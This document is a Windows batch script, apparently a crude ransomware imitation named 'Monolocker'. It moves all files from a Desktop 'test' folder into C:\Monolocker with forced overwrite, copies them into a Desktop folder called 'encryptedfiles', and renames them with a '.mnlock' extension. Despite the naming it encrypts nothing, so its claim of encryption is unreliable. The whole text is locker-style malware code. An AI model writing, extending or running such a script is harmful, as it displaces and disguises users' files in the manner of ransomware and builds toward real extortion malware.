@echo off
cd c:\
md Monolocker
cd C:\
move /y %userprofile%\Desktop\test\*.* c:\Monolocker
cd %userprofile%\Desktop
md encryptedfiles
cd c:\
xcopy c:\Monolocker\*.* %userprofile%\Desktop\encryptedfiles *.* /e
cd %userprofile%\Desktop\encryptedfiles
rename *.* *.mnlock
type nul >> %userprofile%\Desktop\encryptedfiles\*.mnlock